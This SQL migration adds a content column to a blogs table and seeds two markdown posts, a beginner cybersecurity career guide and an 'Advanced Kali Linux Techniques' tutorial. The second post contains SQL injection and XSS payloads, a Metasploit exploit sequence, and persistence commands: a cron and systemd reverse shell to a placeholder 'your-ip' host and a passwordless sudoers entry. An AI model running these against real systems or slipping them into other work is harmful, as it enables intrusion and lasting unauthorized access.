-- Add content column to existing blogs table
ALTER TABLE blogs ADD COLUMN IF NOT EXISTS content TEXT;

-- Update the comment for the content column
COMMENT ON COLUMN blogs.content IS 'Detailed blog post content with markdown formatting';

-- Optional: Update existing sample data to include content
-- This will only work if you have existing rows
UPDATE blogs 
SET content = 'Blog post content coming soon...' 
WHERE content IS NULL;

-- If you want to insert sample data with content (run this after adding the column)
INSERT INTO blogs (title, description, content, image_url, category, created_at) VALUES
(
    'Getting Started with Cybersecurity',
    'A comprehensive guide to beginning your journey in cybersecurity.',
    '# Getting Started with Cybersecurity\n\n## Overview\nCybersecurity is one of the most in-demand fields today, with endless opportunities for growth and innovation. This guide will help you kickstart your journey.\n\n## Why Cybersecurity?\n\n- **Growing Demand**: The cybersecurity job market is projected to grow 31% by 2029\n- **Lucrative Salaries**: Average salary ranges from $70,000 to $150,000+\n- **Constant Learning**: Technology evolves daily, keeping you engaged\n- **Impact**: You\'ll be protecting people and organizations from real threats\n\n## Essential Skills to Develop\n\n### Technical Skills\n\n1. **Networking Fundamentals**\n   - TCP/IP protocols\n   - Network architecture\n   - Wireshark analysis\n\n2. **Operating Systems**\n   - Linux (Kali, Ubuntu)\n   - Windows security\n   - macOS security\n\n3. **Programming**\n   ```python\n   # Example: Simple port scanner\n   import socket\n   import sys\n   \n   def scan_port(target, port):\n       try:\n           sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n           sock.settimeout(1)\n           result = sock.connect_ex((target, port))\n           sock.close()\n           return result == 0\n       except:\n           return False\n   ```\n\n### Soft Skills\n\n- **Problem-solving mindset**\n- **Attention to detail**\n- **Communication skills**\n- **Ethical decision making**\n\n## Learning Path\n\n| Phase | Duration | Focus Areas |\n|-------|----------|-------------|\n| Foundation | 3-6 months | Networking, OS basics |\n| Technical Skills | 6-12 months | Programming, tools |\n| Specialization | 6-12 months | Choose your path |\n| Advanced Topics | Ongoing | Stay updated |\n\n## Recommended Resources\n\n### Online Platforms\n- **TryHackMe**: Beginner-friendly learning platform\n- **HackTheBox**: Challenge-based learning\n- **Coursera**: Academic courses\n- **Udemy**: Practical courses\n\n### Books to Read\n1. *"The Web Application Hacker\'s Handbook"* by Dafydd Stuttard\n2. *"Penetration Testing: A Hands-On Introduction"* by Georgia Weidman\n3. *"Blue Team Field Manual"* by Ben Clark\n\n### Tools to Master\n\n![Security Tools](https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400&h=200&fit=crop&crop=center)\n\n#### Essential Tools\n- **Nmap**: Network scanning\n- **Metasploit**: Exploitation framework\n- **Burp Suite**: Web application testing\n- **Wireshark**: Packet analysis\n- **John the Ripper**: Password cracking\n\n## Career Paths in Cybersecurity\n\n### Offensive Security\n- **Penetration Tester**\n- **Ethical Hacker**\n- **Red Team Specialist**\n\n### Defensive Security\n- **Security Analyst**\n- **Incident Responder**\n- **Blue Team Specialist**\n\n### Governance & Risk\n- **Security Auditor**\n- **Compliance Officer**\n- **Risk Manager**\n\n## Getting Your First Job\n\n### Build Your Portfolio\n\n1. **Create a GitHub profile** with your projects\n2. **Write blog posts** about your learning journey\n3. **Participate in CTF competitions**\n4. **Get certifications** (CompTIA Security+, CEH, OSCP)\n\n### Networking\n\n- Join cybersecurity communities\n- Attend conferences and meetups\n- Connect with professionals on LinkedIn\n- Find a mentor in the field\n\n## Conclusion\n\nCybersecurity is a challenging but rewarding field that offers endless opportunities for growth. Start with the fundamentals, practice regularly, and never stop learning.\n\n> "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford\n\nRemember: With great power comes great responsibility. Always use your skills ethically and legally.\n\n## Next Steps\n\n1. **Set up your learning environment**\n2. **Start with basic networking concepts**\n3. **Practice on legal platforms**\n4. **Join the community**\n5. **Never stop learning!**\n\nHappy hacking! üöÄ',
    'https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=400&h=200&fit=crop&crop=center',
    'Cybersecurity',
    NOW()
),
(
    'Advanced Kali Linux Techniques',
    'Master the art of penetration testing with Kali Linux advanced tools and methodologies.',
    '# Advanced Kali Linux Techniques\n\n## Overview\nKali Linux is the premier distribution for penetration testing and security auditing. This guide covers advanced techniques for professional security testing.\n\n## Advanced Reconnaissance\n\n### Passive Information Gathering\n\n#### DNS Enumeration\n```bash\n# DNS enumeration with fierce\ndnsenum --enum google.com\n\n# Subdomain discovery with subfinder\nsubfinder -d example.com -o subdomains.txt\n\n# DNS zone transfer attempt\ndig axfr @ns1.example.com example.com\n```\n\n#### OSINT Framework\n\n- **Maltego**: Relationship mapping\n- **theHarvester**: Email and domain harvesting\n- **Recon-ng**: Comprehensive reconnaissance framework\n\n### Active Scanning\n\n#### Advanced Nmap Techniques\n\n```bash\n# Comprehensive port scan\nnmap -sS -sV -sC -O -A -p- target.com\n\n# Nmap scripting engine\nnmap --script vuln target.com\n\n# Custom scan with timing\nnmap -T4 -p 21,22,23,53,80,110,143,443,993,995 target.com\n```\n\n## Exploitation Techniques\n\n### Web Application Testing\n\n#### SQL Injection Advanced\n\n```sql\n-- Time-based blind SQL injection\n\'; WAITFOR DELAY \'00:00:05\'--\n\n-- Union-based injection\n\' UNION SELECT 1,username,password,4 FROM users--\n\n-- Error-based injection\n\' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n```\n\n#### XSS Payloads\n\n```javascript\n// Reflected XSS\n<script>alert(\'XSS\')</script>\n\n// Stored XSS with image tag\n<img src=x onerror=alert(\'XSS\')>\n\n// DOM-based XSS\n#<script>alert(document.domain)</script>\n```\n\n### Network Exploitation\n\n#### Metasploit Advanced Usage\n\n```bash\n# Search for exploits\nmsfconsole\nsearch type:exploit platform:linux\n\n# Use specific exploit\nuse exploit/linux/http/apache_mod_cgi_bash_env_exec\n\n# Set options\nset RHOSTS target.com\nset LHOST your-ip\n\n# Run exploit\nexploit\n```\n\n## Post-Exploitation\n\n### Privilege Escalation\n\n#### Linux Privilege Escalation\n\n```bash\n# Check SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Check writable files\nfind / -writable -type f 2>/dev/null\n\n# Check running services\nps aux | grep root\n\n# Check kernel version\nuname -a\n\n# Search for kernel exploits\nsearchsploit linux kernel 4.15\n```\n\n#### Windows Privilege Escalation\n\n```powershell\n# Check user privileges\nwhoami /priv\n\n# Check running services\nsc query type= service state= running\n\n# Check for unquoted service paths\nwmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"\n\n# Check for weak permissions\nicacls "C:\\Program Files\\Software"\n```\n\n## Persistence Mechanisms\n\n### Linux Persistence\n\n```bash\n# Create cron job\necho "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/your-ip/4444 0>&1\'" | crontab -\n\n# Add user to sudoers\necho "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n# Create systemd service\ncat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=Backdoor Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c \'bash -i >& /dev/tcp/your-ip/4444 0>&1\'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl enable backdoor.service\nsystemctl start backdoor.service\n```\n\n## Advanced Tools\n\n### Custom Script Development\n\n#### Python Port Scanner\n\n```python\n#!/usr/bin/env python3\nimport socket\nimport threading\nfrom queue import Queue\nimport sys\n\ntarget = sys.argv[1]\nqueue = Queue()\nopen_ports = []\n\ndef port_scan(port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    except:\n        pass\n\ndef threader():\n    while True:\n        worker = queue.get()\n        port_scan(worker)\n        queue.task_done()\n\n# Create threads\nfor x in range(100):\n    t = threading.Thread(target=threader)\n    t.daemon = True\n    t.start()\n\n# Put ports in queue\nfor port in range(1, 65536):\n    queue.put(port)\n\nqueue.join()\n\nprint(f"Open ports: {sorted(open_ports)}")\n```\n\n## Reporting and Documentation\n\n### Professional Report Structure\n\n1. **Executive Summary**\n   - Key findings\n   - Risk assessment\n   - Recommendations\n\n2. **Technical Details**\n   - Methodology\n   - Tools used\n   - Detailed findings\n\n3. **Evidence**\n   - Screenshots\n   - Logs\n   - Proof of concepts\n\n4. **Remediation**\n   - Step-by-step fixes\n   - Priority levels\n   - Timeline\n\n## Legal and Ethical Considerations\n\n### Rules of Engagement\n\n- **Written authorization** required\n- **Scope definition** clearly documented\n- **Time constraints** respected\n- **Data protection** protocols followed\n\n### Reporting Requirements\n\n- **Vulnerability disclosure** timeline\n- **Responsible disclosure** practices\n- **Legal compliance** (GDPR, HIPAA, etc.)\n\n## Continuous Learning\n\n### Stay Updated\n\n- **Security blogs**: Krebs on Security, Threat Post\n- **Research papers**: USENIX, IEEE Security & Privacy\n- **Conferences**: DEF CON, Black Hat, RSA\n- **Online communities**: Reddit r/netsec, Twitter security community\n\n### Practice Environments\n\n- **HackTheBox**: Challenge-based learning\n- **TryHackMe**: Guided learning paths\n- **VulnHub**: Local practice VMs\n- **PentesterLab**: Web security focus\n\n## Conclusion\n\nMastering Kali Linux and penetration testing requires continuous practice and learning. Always operate within legal boundaries and ethical guidelines.\n\n> "With great power comes great responsibility." - Uncle Ben\n\nStay curious, stay ethical, and keep learning! üêß',
    'https://images.unsplash.com/photo-1558618047-3c8c76ca7d13?w=400&h=200&fit=crop&crop=center',
    'Penetration Testing',
    NOW()
)
ON CONFLICT DO NOTHING;
